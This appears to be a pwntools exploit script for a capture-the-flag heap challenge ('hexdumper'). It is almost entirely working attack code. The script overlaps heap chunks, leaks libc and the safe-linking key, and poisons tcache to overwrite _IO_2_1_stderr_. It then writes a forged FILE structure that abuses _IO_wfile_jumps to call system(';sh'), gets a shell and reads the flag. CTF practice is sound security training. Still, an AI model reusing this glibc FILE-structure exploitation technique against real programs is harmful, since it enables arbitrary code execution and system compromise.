#!/usr/bin/env python3

from pwn import *

exe = ELF("./hexdumper_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.LOCAL:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    else:
        io = remote("127.0.0.1", 1337)
    return io


def create_dump(io, size):
    io.sendlineafter(b"==>", b"1")
    io.sendlineafter(b"size", str(size).encode())
    io.recvuntil(b"at index ")
    return int(io.recvline())


def hexdump_dump(io, idx):
    io.sendlineafter(b"==>", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"+")
    io.recvline()
    dump = []
    while (line := io.recvline().strip()) != b"":
        line = line.split(b"|")[1]
        dump.extend([int(n, 16) for n in line.split()])
    return bytes(dump)


def change_byte(io, idx, offset, val):
    io.sendlineafter(b"==>", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"Offset: ", str(offset).encode())
    io.sendlineafter(b"decimal: ", str(val).encode())


def change_bytes(io, idx, offset, ba):
    for i, byte in enumerate(ba):
        change_byte(io, idx, offset+i, byte)


def merge(io, idx1, idx2):
    io.sendlineafter(b"==>", b"4")
    io.sendlineafter(b"index: ", str(idx1).encode())
    io.sendlineafter(b"index: ", str(idx2).encode())


def resize_dump(io, idx, new_size):
    io.sendlineafter(b"==>", b"5")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"New size: ", str(new_size).encode())


def remove_dump(io, idx):
    io.sendlineafter(b"==>", b"6")
    io.sendlineafter(b"index: ", str(idx).encode())


def list_dumps(io):
    io.sendlineafter(b"==>", b"7")
    dumps = []
    while (line := io.recvline()) != b"":
        idx, len = line.split(b": ")
        idx = int(idx)
        len = int(len.split(b"=")[1])
        dumps.append((idx, len))
    return dumps
    

def coredump(io):
    io.sendlineafter(b"==>", b"0")


def main():
    io = conn()
    
    a = create_dump(io, 16)
    b = create_dump(io, 24)
    c = create_dump(io, 16)
    change_bytes(io, a, 0, p64(0x411))
    resize_dump(io, a, 0)
    merge(io, b, a)
    remove_dump(io, c)
    c = create_dump(io, 0x400)
    change_bytes(io, c, 16+8, p64(0x0000000000020d11))

    leaky_dump = create_dump(io, 0x1000)
    guard_dump = create_dump(io, 32)
    remove_dump(io, leaky_dump)
    hx = hexdump_dump(io, c)
    libc_leak = u64(hx[32:32+8])
    info(f"{hex(libc_leak)=}")
    libc.address = libc_leak - 0x211b20
    info(f"{hex(libc.address)=}")
    
    d = create_dump(io, 0xf0-8)
    e = create_dump(io, 0xf0-8)
    f = create_dump(io, 0xf0-8)
    g = create_dump(io, 0xf0-8)
    
    remove_dump(io, g)
    hx = hexdump_dump(io, c)
    xor_key = u64(hx[0x2f0:0x2f0+8])
    info(f"{hex(xor_key)=}")
    remove_dump(io, f)
    remove_dump(io, e)
    remove_dump(io, d)

    change_bytes(io, c, 0x20, p64(((libc.sym['_IO_2_1_stderr_']) ^ (xor_key))))

    file = FileStructure(0)
    file.flags = u64(p32(0xfbad0101) + b";sh\0")
    file._IO_save_end = libc.sym["system"]
    file._lock = libc.sym["_IO_2_1_stderr_"] - 0x10
    file._wide_data = libc.sym["_IO_2_1_stderr_"] - 0x10
    file._offset = 0
    file._old_offset = 0
    file.unknown2 = b"\x00"*24+ p32(1) + p32(0) + p64(0) + \
        p64(libc.sym["_IO_2_1_stderr_"] - 0x10) + \
        p64(libc.sym["_IO_wfile_jumps"] + 0x18 - 0x58)

    x = create_dump(io, 0xf0-8)
    target = create_dump(io, 0xf0-8)

    change_bytes(io, target, 0, bytes(file))

    io.sendline(b"cat flag")
    io.sendline(b"cat flag")

    io.recvuntil(b"BtSCTF")
    exit(0)


if __name__ == "__main__":
    main()
